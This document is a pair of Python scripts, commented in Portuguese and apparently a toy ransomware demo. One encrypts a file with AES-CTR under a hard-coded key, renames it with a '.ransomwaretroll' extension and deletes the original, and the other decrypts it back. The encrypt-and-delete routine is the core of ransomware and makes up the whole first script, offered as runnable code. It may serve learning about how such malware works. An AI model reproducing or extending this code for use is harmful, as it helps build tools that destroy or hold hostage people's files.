# Script 1: Criptografar Arquivo
# Este script criptografa um arquivo e salva o resultado com uma extensão modificada.

import os
import pyaes

def encrypt_file(input_file, encryption_key):
    """
    Criptografa um arquivo usando AES no modo CTR.
    
    :param input_file: Nome do arquivo a ser criptografado
    :param encryption_key: Chave de criptografia
    """
    try:
        # Abrir e ler o arquivo original
        with open(input_file, 'rb') as file:
            file_data = file.read()

        # Inicializar criptografia
        aes = pyaes.AESModeOfOperationCTR(encryption_key)
        encrypted_data = aes.encrypt(file_data)

        # Criar o novo arquivo criptografado
        encrypted_file = f"{input_file}.ransomwaretroll"
        with open(encrypted_file, 'wb') as file:
            file.write(encrypted_data)

        # Remover o arquivo original
        os.remove(input_file)

        print(f"Arquivo '{input_file}' criptografado com sucesso como '{encrypted_file}'.")

    except FileNotFoundError:
        print(f"Erro: Arquivo '{input_file}' não encontrado.")
    except Exception as e:
        print(f"Ocorreu um erro: {e}")

# Parâmetros
input_file = 'teste.txt'
encryption_key = b'testeransomwares'  # Deve ter 16, 24 ou 32 bytes

# Executar criptografia
encrypt_file(input_file, encryption_key)

Descriptografar Arquivo
Este script descriptografa um arquivo previamente criptografado.

import os
import pyaes

def decrypt_file(encrypted_file, output_file, decryption_key):
    """
    Descriptografa um arquivo criptografado usando AES no modo CTR.
    
    :param encrypted_file: Nome do arquivo criptografado
    :param output_file: Nome do arquivo de saída (descriptografado)
    :param decryption_key: Chave de descriptografia
    """
    try:
        # Abrir e ler o arquivo criptografado
        with open(encrypted_file, 'rb') as file:
            encrypted_data = file.read()

        # Inicializar descriptografia
        aes = pyaes.AESModeOfOperationCTR(decryption_key)
        decrypted_data = aes.decrypt(encrypted_data)

        # Salvar o arquivo descriptografado
        with open(output_file, 'wb') as file:
            file.write(decrypted_data)

        # Remover o arquivo criptografado
        os.remove(encrypted_file)

        print(f"Arquivo '{encrypted_file}' descriptografado com sucesso como '{output_file}'.")

    except FileNotFoundError:
        print(f"Erro: Arquivo '{encrypted_file}' não encontrado.")
    except Exception as e:
        print(f"Ocorreu um erro: {e}")

# Parâmetros
encrypted_file = 'teste.txt.ransomwaretroll'
output_file = 'teste.txt'
decryption_key = b'testeransomwares'  # Deve ter 16, 24 ou 32 bytes

# Executar descriptografia
decrypt_file(encrypted_file, output_file, decryption_key)

